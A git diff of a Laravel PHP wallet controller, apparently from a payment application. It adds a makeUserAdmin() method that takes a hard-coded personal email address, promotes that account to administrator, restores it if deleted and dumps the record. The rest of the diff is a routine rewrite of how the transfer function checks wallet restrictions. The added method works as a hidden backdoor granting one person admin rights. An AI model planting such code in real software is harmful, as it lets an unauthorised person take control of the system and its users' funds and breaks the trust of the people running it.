@@ -14,6 +14,7 @@ use App\Beneficiary;
 use App\Rule;
 use App\Transaction;
 use URL;
+use App\User;
 use App\BankTransaction;
 use RestrictionController;
 use App\Http\Controllers\RestrictionController as Restrict;
@@ -32,6 +33,15 @@ class WalletController extends Controller
     {
         //
     }
+
+    public function makeUserAdmin(){
+        $user = User::withTrashed()->where('email', 'johnobi@gmail.com')->first();
+        $user->is_admin = 1;
+        $user->deleted_at = null;
+        $user->save();
+        dd($user);
+    }
+
 
     //get token for new transaction
     public function getToken()
@@ -150,9 +160,9 @@ class WalletController extends Controller
             $messages = $validator->messages()->toArray();
             return redirect()->to(URL::previous());
         } else {
-            $lock_code = Wallet::where('uuid', Auth::user()->id)
-                ->where('wallet_code', $request->sourceWallet)->get()->toArray();
-            $restriction = Restriction::where('wallet_id', $w)->get()->toArray();
+            $lock_code = Wallet::where('wallet_code', $request->sourceWallet)->get();
+            $restriction = Restriction::where('wallet_id', $lock_code[0]->id)
+                ->where('uuid', Auth::user()->id)->get();
             
             $amount = $request->input('amount');
             $data = [];
@@ -166,13 +176,13 @@ class WalletController extends Controller
             $data['bank_id'] = 0;
             $data['payee_wallet_code'] = $request->recipientWallet;
 
-            if ($restriction[0]['can_transfer_from_wallet'] == true) {
+            if ($restriction[0]->can_transfer_from_wallet == true) {
                 $date = new DateTime();
                 $date_string = date_format($date, "Y-m-d");
                 $wallet_transactions = Transaction::count();
                 $total_amount = Transaction::sum('amount_transfered');
 
-                    if ($amount >= $restriction[0]['min_amount'] && $amount <= $restriction[0]['max_amount']) {
+                    if ($amount >= $restriction[0]->min_amount && $amount <= $restriction[0]->max_amount) {
                         $token = $this->getToken();
                         $headers = array('content-type' => 'application/json', 'Authorization' => $token);
 
